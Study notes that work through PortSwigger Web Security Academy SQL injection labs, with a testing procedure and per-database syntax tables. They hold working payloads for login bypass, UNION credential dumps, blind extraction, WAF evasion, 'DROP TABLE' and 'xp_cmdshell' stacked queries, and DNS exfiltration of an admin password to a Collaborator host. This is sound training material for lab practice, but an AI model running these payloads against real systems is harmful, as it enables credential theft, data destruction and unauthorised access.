# SQLi Notes — PortSwigger Web Security Academy

---

## DISTINCT SQLi VULNERABILITY TYPES

### 1. Classic SQLi (In-Band)
- **Error-Based** — DB returns error messages containing leaked data in the HTTP response.
- **Union-Based** — Attacker appends a `UNION SELECT` to retrieve data from other tables via the same response channel.

### 2. Blind SQLi
- **Boolean-Based** — Conditions change the page response (content, length, element presence).
- **Time-Based** — `SLEEP()` / `pg_sleep()` delays confirm truth of injected conditions.

### 3. Out-of-Band (OOB/OAST)
- No data returned in response at all. Force DB to make a DNS/HTTP callout to an attacker-controlled server.
- Detected and confirmed using **Burp Collaborator** (Pro feature).

### 4. Second-Order SQLi
- Payload stored in the DB, executed later in a different query context (e.g. injected into a username, triggered when admin views the profile).

### 5. Stacked Queries (Batch SQLi)
- Inject multiple statements using `;`. Works in MSSQL, PostgreSQL. Often disabled in MySQL+PHP.
- Example: `id=1; DROP TABLE users--`

### 6. Alternative Encoding Attacks (Filter Bypass)
- Hex encoding: `id=0x41`
- URL encoding: `%27 OR %271%27=%271`
- Comment injection: `UN/**/ION SE/**/LECT`
- XML entity encoding (see Lab 17)

### 7. Header / Out-of-Parameter SQLi
- Injection via cookies, `User-Agent`, `Referer`, `X-Forwarded-For` headers.
- Example: `Cookie: trackingId=xyz' OR '1'='1`

### 8. Blind SQLi in JSON/XML/REST APIs
- Injection inside a JSON or XML body rather than a URL parameter.
- Example: `{ "id": "1' OR '1'='1" }`

### 9. Login Bypass via SQLi
- Exploiting authentication logic. Covered in Lab 02.

### 10. Stored Procedure Injection (MSSQL)
- Abusing built-in procedures with malicious input.
- Example: `id=1; EXEC xp_cmdshell('whoami')--`

### 11. ORM/Framework SQLi
- Injection through unsafe use of query builders (Hibernate, Doctrine, etc.)

### 12. NoSQL Injection (SQLi variant)
- Targets MongoDB, CouchDB etc.
- Example: `{ "username": { "$ne": null }, "password": { "$ne": null } }`

---

## SQL INJECTION TESTING SOP

### Step 1 — Identify Injection Points
- URL query parameters (`?id=1`, `?category=Gifts`)
- Form inputs (login, search, signup, profile fields)
- HTTP Headers (`User-Agent`, `Referer`, `X-Forwarded-For`)
- Cookies (`trackingId=abc123`)
- JSON/XML API bodies

### Step 2 — Baseline Testing (Probe for Reaction)
| Payload | What you're testing |
|---|---|
| `'` | Break out of string context → look for error or behaviour change |
| `''` | Escaped quote → page should return to normal if sanitised |
| `--` | Comment injection → truncates query |
| `' OR 1=1--` | Always-true → more data returned |
| `' AND 1=2--` | Always-false → less/no data returned |
| `' AND SLEEP(5)--` | Time delay → confirms blind injection |

### Step 3 — Error-Based
- Look for: `You have an error in your SQL syntax`, `Unclosed quotation mark`, `ORA-00933`
- Use type-cast errors to extract data (see Lab 18)

### Step 4 — Union-Based
1. Find column count: `ORDER BY n--` (increment until error)
2. Find string columns: `UNION SELECT 'test',NULL,NULL--` (move 'test' across positions)
3. Fingerprint DB: `UNION SELECT @@version,NULL--` etc.
4. Enumerate: `information_schema.tables` → `information_schema.columns` → dump data

### Step 5 — Boolean-Based Blind
- `AND '1'='1` (TRUE) vs `AND '1'='2` (FALSE) → different responses = confirmed
- Extract char by char: `AND SUBSTR(password,1,1)='a'--`
- Automate with Burp Intruder

### Step 6 — Time-Based Blind
- `AND SLEEP(5)--` (MySQL) / `AND pg_sleep(5)--` (PostgreSQL)
- Use `CASE WHEN ... THEN pg_sleep(10) ELSE NULL END` for conditional delays
- Automate with Burp Intruder, watch response times

### Step 7 — Out-of-Band
- Trigger DNS callout with Burp Collaborator subdomain
- Confirm interaction, then exfiltrate data via subdomain payload

### Step 8 — Stacked Queries (if supported)
- `1; SELECT pg_sleep(5)--`
- `1; DROP TABLE users--` ← NEVER on real targets

### Step 9 — Second-Order
- Submit payload in stored fields (username, profile bio)
- Trigger in a later query context (admin dashboard, report generation)

### Step 10 — Alternative Encodings (Filter Bypass)
- URL-encode: `%27` = `'`, `%20` = space
- Double URL-encode: `%2527` = `'`
- XML entity encode: `&#x27;` = `'` (see Lab 17)
- Comment splitting: `UN/**/ION`

### Step 11 — Auth Bypass
- Username field: `administrator'--`
- Username field: `' OR 1=1--`
- Password field: `anything' OR '1'='1`

### Step 12 — Confirm Impact
- DB version: `@@version` (MySQL/MSSQL) / `version()` (PostgreSQL) / `v$version` (Oracle)
- Current user: `user()` / `current_user`
- Current DB: `database()` / `current_database()`

---

## QUICK BURP WORKFLOW
1. Intercept request → Send to **Repeater** (Ctrl+R)
2. Insert probes (`'`, `--`, `OR 1=1`)
3. Observe response differences (length, content, status code, time)
4. Move to **Intruder** for boolean/time-based enumeration
5. Use **Comparer** to diff two responses side by side
6. Confirm exploitability → extract data

---
---

## PORTSWIGGER LABS

---

### #01 — SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

**URL:** https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data  
**Vulnerability:** Product category filter  
**Aim:** Display one or more unreleased products

**Background:**
Selecting a product category sends a SQL query to the database:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

**Analysis:**
```sql
-- Normal query
SELECT * FROM products WHERE category = 'Gifts' AND released = 1

-- Inject ' → breaks query → 500 error
SELECT * FROM products WHERE category = ''' AND released = 1

-- Inject '-- → comments out AND released = 1 → returns all Gifts including unreleased
SELECT * FROM products WHERE category = 'Gifts'-- AND released = 1

-- Inject ' OR 1=1-- → 1=1 always TRUE → returns ALL products from ALL categories
SELECT * FROM products WHERE category = '' OR 1=1-- AND released = 1
```

**Payload used:** `' OR 1=1--`

> 📝 `AND released = 1` is a filter hiding unreleased products. Commenting it out OR short-circuiting with OR 1=1 bypasses it. The `--` turns everything after it into a comment.

---

### #02 — SQL injection vulnerability allowing login bypass

**URL:** https://portswigger.net/web-security/sql-injection/lab-login-bypass  
**Vulnerability:** Login function  
**Aim:** Log in as the administrator user

**Background:**
```sql
SELECT * FROM users WHERE username = 'administrator' AND password = 'admin'
```

**Analysis:**
```sql
-- Inject ' into username → 500 error → confirms vulnerability
SELECT * FROM users WHERE username = 'administrator'' AND password = 'admin'

-- Inject administrator'-- → comments out the password check entirely
SELECT * FROM users WHERE username = 'administrator'-- AND password = 'admin'
```

**Payload used:** Username: `administrator'--` | Password: anything

> 📝 The `--` comments out `AND password = '...'`. The DB only checks if username = 'administrator' exists, and it does, so login succeeds. This works because the developer is trusting user input directly inside the query string.

---

### #03 — SQL injection UNION attack — determining the number of columns returned by the query

**URL:** https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns  
**Vulnerability:** Product category filter  
**Aim:** Determine the number of columns returned by the query

**Background:**
UNION attacks require your injected SELECT to have the exact same number of columns as the original query. You need to find that number before you can extract anything.

**Analysis:**

Method A — ORDER BY (preferred, cleaner):
```sql
' ORDER BY 1--   → 200 OK
' ORDER BY 2--   → 200 OK
' ORDER BY 3--   → 200 OK
' ORDER BY 4--   → 500 ERROR  ← means 3 columns exist
```

Method B — UNION SELECT NULL (NULL is compatible with any data type):
```sql
' UNION SELECT NULL--          → error
' UNION SELECT NULL,NULL--     → error
' UNION SELECT NULL,NULL,NULL-- → 200 OK  ← 3 columns confirmed
```

**Payload used:** `' ORDER BY 3--` then `' UNION SELECT NULL,NULL,NULL--`

> 📝 Why NULL? Because NULL is data-type agnostic — it won't cause a type mismatch error the way `'test'` or `1` might. It's the safest placeholder to count columns. On Oracle DB, you must append `FROM dual` → `' UNION SELECT NULL,NULL FROM dual--`

---

### #04 — SQL injection UNION attack — finding a column containing text

**URL:** https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text  
**Vulnerability:** Product category filter  
**Aim:** Find which column(s) return string data (needed to output text in the response)

**Background:**
Not every column in the original query holds string data. Some hold integers, booleans, etc. You need to find a column that accepts and displays a string value, or the DB will throw a type error.

**Analysis:**
After confirming column count (e.g. 3 columns), probe each position:
```sql
' UNION SELECT 'test',NULL,NULL--   → if 'test' appears on page → column 1 is a string
' UNION SELECT NULL,'test',NULL--   → if 'test' appears on page → column 2 is a string
' UNION SELECT NULL,NULL,'test'--   → if 'test' appears on page → column 3 is a string
```
The lab provides a specific random value to inject (e.g. `'3nWkL5'`) — use that instead of 'test'.

**Payload used:** `' UNION SELECT NULL,'3nWkL5',NULL--` (whichever position works)

> 📝 This step matters because when you extract real data (passwords, usernames), you need to output it via a string-compatible column. If you skip this and pick the wrong column, you'll get a type error and no output.

---

### #05 — SQL injection UNION attack — retrieving data from other tables

**URL:** https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables  
**Vulnerability:** Product category filter  
**Aim:** Retrieve usernames and passwords from the `users` table, then log in as administrator

**Background:**
You already know the column count and which columns hold strings. Now you point them at a different table entirely — the `users` table.

**Analysis:**
```sql
-- 2 string columns confirmed. Aim them at users table:
' UNION SELECT username,password FROM users--

-- This appends all rows from users to the product query result.
-- Look for administrator in the response.
```

**Payload used:** `' UNION SELECT username,password FROM users--`

> 📝 This is the core UNION payoff — you've redirected the output of the original query to show you data from a completely different table. The app doesn't know the difference; it just renders whatever the DB sends back.

---

### #06 — SQL injection UNION attack — retrieving multiple values in a single column

**URL:** https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column  
**Vulnerability:** Product category filter  
**Aim:** Retrieve usernames and passwords from the `users` table (only ONE string column available)

**Background:**
Sometimes only one column in the original query holds string data, but you need to extract two values (e.g. username AND password). The solution is string concatenation — pack both values into the one usable column with a visible separator.

**Analysis:**
```sql
-- Only column 2 holds strings. Concatenate username + password into it:

-- PostgreSQL / Oracle:
' UNION SELECT NULL,username||':'||password FROM users--

-- MySQL:
' UNION SELECT NULL,concat(username,':',password) FROM users--

-- MSSQL:
' UNION SELECT NULL,username+':'+password FROM users--

-- Output in page: administrator:secretpassword
```

**Payload used:** `' UNION SELECT NULL,username||':'||password FROM users--`

> 📝 The `||` is the concatenation operator for PostgreSQL/Oracle. The `:` in the middle is just a separator so you can split username from password when you read the output. You can use any character as the separator — `~`, `|`, `:`, etc.

---

### #07 — SQL injection attack — querying the database type and version on Oracle

**URL:** https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle  
**Vulnerability:** Product category filter  
**Aim:** Display the database version string

**Background:**
Oracle has two quirks compared to other databases:
1. Every `SELECT` must query FROM a table — Oracle has a built-in dummy table called `dual` for this.
2. The version is stored in `v$version`, not `@@version` or `version()`.

**Analysis:**
```sql
-- Column count first:
' ORDER BY 2--   → 2 columns

-- Find string column:
' UNION SELECT 'test',NULL FROM dual--
' UNION SELECT NULL,'test' FROM dual--

-- Get version (once string column confirmed as col 1):
' UNION SELECT banner,NULL FROM v$version--
```

**Payload used:** `' UNION SELECT banner,NULL FROM v$version--`

> 📝 `v$version` is an Oracle system view (think of it as a built-in read-only table). The `banner` column contains the full version string. The `FROM dual` is mandatory on Oracle — leaving it out causes a syntax error even though the intent is clear.

---

### #08 — SQL injection attack — querying the database type and version on MySQL and Microsoft

**URL:** https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft  
**Vulnerability:** Product category filter  
**Aim:** Display the database version string

**Background:**
MySQL and MSSQL both use `@@version`. MySQL requires a space after `--` for comments to work (`-- ` with trailing space), or you can use `#` instead.

**Analysis:**
```sql
-- Column count:
' ORDER BY 2--+    (MySQL needs space after --, use --+ or #)

-- Get version:
' UNION SELECT @@version,NULL--+
' UNION SELECT @@version,NULL#    (alternative MySQL comment)
```

**Payload used:** `' UNION SELECT @@version,NULL--+`

> 📝 This is a common gotcha — in MySQL `--` alone doesn't work as a comment unless followed by a space. In Burp/URLs that space often gets stripped, so `--+` (where `+` URL-decodes to space) or `#` are safer. PortSwigger labs often require `--+` for MySQL labs.

---

### #09 — SQL injection attack — listing the database contents on non-Oracle databases

**URL:** https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle  
**Vulnerability:** Product category filter  
**Aim:** Find the users table, find the credential columns, dump the administrator password

**Background:**
`information_schema` is a standard metadata schema available in MySQL, PostgreSQL, and MSSQL. It contains a map of all tables and columns in the database.

**Analysis:**
```sql
-- Step 1: List all tables
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- Step 2: Find columns in the users table (replace 'users_xyz' with actual name found above)
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_xyz'--

-- Step 3: Dump credentials
' UNION SELECT username_col,password_col FROM users_xyz--
```

**Payload used (sequence):**
1. `' UNION SELECT table_name,NULL FROM information_schema.tables--`
2. `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_abcdef'--`
3. `' UNION SELECT username,password FROM users_abcdef--`

> 📝 `information_schema` is your map of the entire database. `information_schema.tables` lists every table. `information_schema.columns` lists every column in every table. Once you have the real table and column names, you can dump anything you want.

---

### #10 — SQL injection attack — listing the database contents on Oracle

**URL:** https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle  
**Vulnerability:** Product category filter  
**Aim:** Find the users table, find the credential columns, dump the administrator password

**Background:**
Oracle doesn't use `information_schema`. Its equivalent views are `all_tables` and `all_tab_columns`. Same logic, different table names.

**Analysis:**
```sql
-- Step 1: List all tables
' UNION SELECT table_name,NULL FROM all_tables--

-- Step 2: Find columns in the users table
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_XYZ'--
  -- Note: Oracle table names are UPPERCASE by default

-- Step 3: Dump credentials
' UNION SELECT username,password FROM USERS_XYZ--
```

**Payload used (sequence):**
1. `' UNION SELECT table_name,NULL FROM all_tables--`
2. `' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'--`
3. `' UNION SELECT username,password FROM USERS_ABCDEF--`

> 📝 Key Oracle differences from non-Oracle: use `all_tables` not `information_schema.tables`, use `all_tab_columns` not `information_schema.columns`, table names are usually UPPERCASE, and every SELECT needs `FROM dual` if not querying a real table.

---

### #11 — Blind SQL injection with conditional responses

**URL:** https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses  
**Vulnerability:** Tracking cookie (`TrackingId`)  
**Aim:** Retrieve the administrator password from the users table, log in

**Background:**
The SQL query result is never shown in the response. However, the page shows a "Welcome back!" message if the query returns any rows. That message is your TRUE/FALSE signal.

**Analysis:**
```sql
-- Confirm vulnerability:
' AND 1=1--   → Welcome back! appears (TRUE)
' AND 1=2--   → Welcome back! disappears (FALSE)

-- Confirm users table exists:
' AND (SELECT 1 FROM users LIMIT 1)=1--   → Welcome back!

-- Confirm administrator user exists:
' AND (SELECT 1 FROM users WHERE username='administrator')=1--   → Welcome back!

-- Find password length (send to Intruder, iterate n from 1 upward):
' AND (SELECT 1 FROM users WHERE username='administrator' AND LENGTH(password)>n)=1--
-- When Welcome back disappears → that n is the password length (confirmed: 20)

-- Extract password char by char (send to Intruder, a-z0-9 wordlist):
' AND (SELECT 1 FROM users WHERE username='administrator' AND SUBSTR(password,1,1)='a')=1--
-- Move position: SUBSTR(password,2,1), SUBSTR(password,3,1) etc.
```

**Burp Intruder setup:**
- Attack type: Sniper
- Payload position: the character `'a'` at the end
- Payload list: a-z, 0-9
- Grep match: `Welcome back` → column added to results
- The row with the grep match = correct character

> 📝 This lab introduced the core concept of blind boolean injection — you're not reading data, you're asking yes/no questions. Each character requires up to 36 requests (26 letters + 10 digits). For a 20-char password that's up to 720 requests. Intruder automates this completely.

---

### #12 — Blind SQL injection with conditional errors

**URL:** https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors  
**Vulnerability:** Tracking cookie (`TrackingId`)  
**Aim:** Retrieve the administrator password from the users table, log in

**Background:**
The page doesn't change content based on query results. But if the SQL causes a **syntax or runtime error**, the app returns HTTP 500. No error = 200. The error itself is your TRUE/FALSE signal.

**DB is Oracle** (identified by behaviour).

**Analysis:**
```sql
-- Confirm vulnerability:
'          → 500 (syntax error — unclosed string)
''         → 200 (closed properly — no error)
'--        → 200

-- Trigger error conditionally using CASE/WHEN:
-- CASE checks a condition. If TRUE → execute TO_CHAR(1/0) which causes divide-by-zero (500)
--                           If FALSE → return 'a' harmlessly (200)

' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
→ 500 (1=1 is TRUE → division by zero triggered)

' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
→ 200 (1=2 is FALSE → returns 'a' → no error)

-- Find password length (Intruder, iterate n):
' AND (SELECT CASE WHEN LENGTH(password)>n THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--
-- 500 when n < actual length, 200 when n >= actual length → length = 20

-- Extract chars (Intruder, a-z0-9 payload):
' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--
```

**Intruder setup:** Sniper, payload on `'a'` character, grep on status code 500 = match.

> 📝 `TO_CHAR(1/0)` is the Oracle way to force a runtime error. MySQL equivalent is `EXTRACTVALUE(1,0x0a)`. PostgreSQL: `CAST(1/0 AS text)`. The CASE WHEN construct is your if/else inside SQL — it's the backbone of conditional error attacks.

---

### #13 — Blind SQL injection with time delays

**URL:** https://portswigger.net/web-security/sql-injection/blind/lab-time-delays  
**Vulnerability:** Tracking cookie  
**Aim:** Cause a 10-second delay to confirm time-based blind SQLi

**Background:**
No content change, no error message. The only signal you have is how long the server takes to respond.

**DB is PostgreSQL** (identified by which delay payload worked).

**Analysis:**
```sql
-- Test delay payloads until one works:
' SELECT pg_sleep(10)--      → no delay (stacked query may be filtered)
' || (SELECT pg_sleep(10))--  → 10 second delay ✅  ← PostgreSQL confirmed

-- The || here is string concatenation (PostgreSQL) — it forces evaluation of the subquery
```

**Payload used:** `' || (SELECT pg_sleep(10))--`

> 📝 The `||` concatenation trick forces the DB to evaluate the subquery as part of the expression. It's not a stacked query (no `;`) so it bypasses filters that block stacked queries. When the response takes 10 seconds → confirmed time-based blind SQLi on PostgreSQL.

---

### #14 — Blind SQL injection with time delays and information retrieval

**URL:** https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval  
**Vulnerability:** Tracking cookie  
**Aim:** Retrieve the administrator password, log in

**Background:**
Same as Lab 13 (PostgreSQL, `||` concatenation) but now you actually extract data using conditional delays.

**Analysis:**
```sql
-- Confirm conditional delay works:
' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END)--  → delay ✅

-- Confirm users table exists:
' || (SELECT CASE WHEN EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name='users') THEN pg_sleep(10) ELSE NULL END)--

-- Confirm username and password columns exist:
' || (SELECT CASE WHEN EXISTS(SELECT 1 FROM information_schema.columns WHERE table_name='users' AND column_name='username') THEN pg_sleep(10) ELSE NULL END)--

-- Confirm administrator user exists:
' || (SELECT CASE WHEN EXISTS(SELECT 1 FROM users WHERE username='administrator') THEN pg_sleep(10) ELSE NULL END)--

-- Find password length (Intruder, iterate n — watch response times):
'; SELECT CASE WHEN (username='administrator' AND LENGTH(password)>n) THEN pg_sleep(10) ELSE NULL END FROM users--
-- ⚠️ URL encode this payload — it only works URL-encoded

-- Extract password chars (Intruder, a-z0-9, watch response times):
'; SELECT CASE WHEN (username='administrator' AND ascii(SUBSTR(password,1,1))>n) THEN pg_sleep(10) ELSE NULL END FROM users--
```

**Note:** The `||` concatenation method didn't work for the length/char extraction — stacked query (`;`) was required, but **must be URL-encoded** to work.

> 📝 `ascii(SUBSTR(password,1,1))` returns the ASCII number of the character. Comparing with `>n` lets you binary search (e.g. >110 → true → >116 → false → it's between 110–116 → narrow down). This halves the required requests per character vs checking each letter directly.

---

### #15 — Blind SQL injection with out-of-band interaction

**URL:** https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band  
**Vulnerability:** Tracking cookie  
**Aim:** Trigger a DNS lookup to Burp Collaborator

**Background:**
The SQL query runs asynchronously — no content change, no error, no time signal. The only way to confirm injection is to force the DB to make a network request to a server you control.

**Requires:** Burp Suite Pro (Collaborator feature)

**Analysis:**
```sql
-- Oracle payload (most common in PortSwigger OOB labs):
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLABORATOR.NET/"> %remote;]>'),'/l') FROM dual--

-- MSSQL alternative:
'; exec master..xp_dirtree '//COLLABORATOR.NET/a'--

-- MySQL alternative:
' AND LOAD_FILE('\\\\COLLABORATOR.NET\\file')--
```

**Steps:**
1. Open Burp Suite Pro → Burp menu → Burp Collaborator client → Copy to clipboard
2. Paste your Collaborator URL into the payload where `COLLABORATOR.NET` appears
3. Send the request
4. Click "Poll now" in the Collaborator client
5. DNS interaction appears → lab solved

> 📝 OOB is your last resort when all other techniques fail. The DB makes an outbound DNS/HTTP request and you catch it externally. You don't see anything in the HTTP response at all — the proof is entirely in Collaborator's interaction log.

---

### #16 — Blind SQL injection with out-of-band data exfiltration

**URL:** https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration  
**Vulnerability:** Tracking cookie  
**Aim:** Retrieve the administrator password via DNS exfiltration, log in

**Background:**
Same setup as Lab 15 (async execution, no response signal) but now you need to actually extract data — specifically the administrator password — and embed it inside the DNS lookup so it gets sent to your Collaborator server.

**Requires:** Burp Suite Pro (Collaborator feature)

**Analysis:**
```sql
-- Oracle: embed password as a DNS subdomain in the lookup URL
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLABORATOR.NET/"> %remote;]>'),'/l') FROM dual--

-- MSSQL alternative:
'; declare @p varchar(1024);
set @p=(SELECT TOP 1 password FROM users WHERE username='administrator');
exec('master..xp_dirtree "//'+@p+'.COLLABORATOR.NET/a"')--
```

**Steps:**
1. Copy Collaborator subdomain
2. Insert into payload where `COLLABORATOR.NET` appears
3. Send request
4. Poll Collaborator → interaction shows: `[password-here].COLLABORATOR.NET`
5. Extract the password from the subdomain prefix, log in as administrator

> 📝 The password gets embedded into the DNS hostname itself — when the DB resolves `secretpassword123.yourcollab.net`, Collaborator records the full hostname. You read it right out of the interaction log. This is why DNS exfiltration works even in the most locked-down environments — DNS is rarely blocked outbound.

---

### #17 — SQL injection with filter bypass via XML encoding

**URL:** https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding  
**Vulnerability:** Stock check feature (XML body in POST request)  
**Aim:** Retrieve the administrator password from the users table, log in

**Background:**
The application sends a POST request with an XML body to check stock levels. A WAF (Web Application Firewall) is present and blocks standard SQLi payloads. The trick is that XML supports HTML entity encoding, and the WAF doesn't decode entities before checking — but the DB does.

**Analysis:**
```
-- Normal POST body:
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>

-- Inject into storeId — WAF blocks: UNION SELECT NULL
-- Bypass with XML entity encoding of the payload:
-- U → &#x55;  N → &#x4e;  etc.  (hex entities)

<storeId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; username||'~'||password FROM users--</storeId>
```

**Steps:**
1. Intercept the stock check POST request in Burp
2. Send to Repeater
3. Install the **Hackvertor** extension (BApp Store) — it handles the encoding automatically
4. Wrap your payload in `<@hex_entities>` Hackvertor tag:
   ```xml
   <storeId><@hex_entities>1 UNION SELECT username||'~'||password FROM users</@hex_entities></storeId>
   ```
5. Hackvertor auto-encodes on send → WAF sees encoded gibberish → DB decodes and executes → credentials returned in response

**Payload (via Hackvertor):**
```xml
<storeId><@hex_entities>1 UNION SELECT username||'~'||password FROM users</@hex_entities></storeId>
```

> 📝 This is a critical real-world concept: WAFs do keyword matching on the raw request. XML entity encoding (`&#x55;` = `U`) hides the keywords from the WAF while remaining valid to the SQL parser, which decodes entities before execution. Hackvertor is a Burp extension that makes encoding transformations easy — it's essential to have installed.

---

### #18 — Visible error-based SQL injection

**URL:** https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based  
**Vulnerability:** Tracking cookie  
**Aim:** Retrieve the administrator password from the users table, log in

**Background:**
The query result is never shown in the response. However, SQL **error messages** are returned verbatim — and those error messages can be made to contain the actual data you're trying to extract. This is PostgreSQL.

**Analysis:**
```sql
-- Probe: inject ' → app returns full error:
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '4parP7dR9rkLhPYW''. Expected char

-- This reveals: the full query structure. We're injecting into a single-quoted string.

-- Confirm error leakage with type cast:
' AND CAST((SELECT 1) AS int)--
→ ERROR: argument of AND must be type boolean, not type integer

-- Fix the boolean:
' AND CAST((SELECT 1) AS int)=1--  → 200 OK

-- Extract username via type cast error:
' AND CAST((SELECT username FROM users LIMIT 1) AS int)=1--
→ ERROR: invalid input syntax for type integer: "administrator"
-- ↑ The error message leaks the value we tried to cast!

-- Extract password the same way:
' AND CAST((SELECT password FROM users LIMIT 1) AS int)=1--
→ ERROR: invalid input syntax for type integer: "p4ssw0rdhere"
```

**Payload used:**
1. `' AND CAST((SELECT username FROM users LIMIT 1) AS int)=1--`
2. `' AND CAST((SELECT password FROM users LIMIT 1) AS int)=1--`

> 📝 `CAST(string AS int)` forces a type conversion. When it fails on a string, PostgreSQL's error message says "invalid input syntax for integer: [the actual string value]". That's how the data leaks — straight out of the error message. This technique is sometimes called **out-of-band in the error channel** — no UNION needed, no blind guessing needed.

---

## REFERENCE — DB-SPECIFIC SYNTAX

| Feature | MySQL | PostgreSQL | MSSQL | Oracle |
|---|---|---|---|---|
| Version | `@@version` | `version()` | `@@version` | `SELECT banner FROM v$version` |
| Comment | `--+` or `#` | `--` | `--` | `--` |
| String concat | `concat(a,b)` | `a\|\|b` | `a+b` | `a\|\|b` |
| Substring | `SUBSTR(s,1,1)` | `SUBSTRING(s,1,1)` | `SUBSTRING(s,1,1)` | `SUBSTR(s,1,1)` |
| Delay | `SLEEP(5)` | `pg_sleep(5)` | `WAITFOR DELAY '0:0:5'` | `DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)` |
| List tables | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` | `all_tables` |
| List columns | `information_schema.columns` | `information_schema.columns` | `information_schema.columns` | `all_tab_columns` |
| Dummy table | not needed | not needed | not needed | `FROM dual` (required) |
| Error trigger | `EXTRACTVALUE(1,0x0a)` | `CAST(1/0 AS text)` | `CONVERT(int,'a')` | `TO_CHAR(1/0)` |
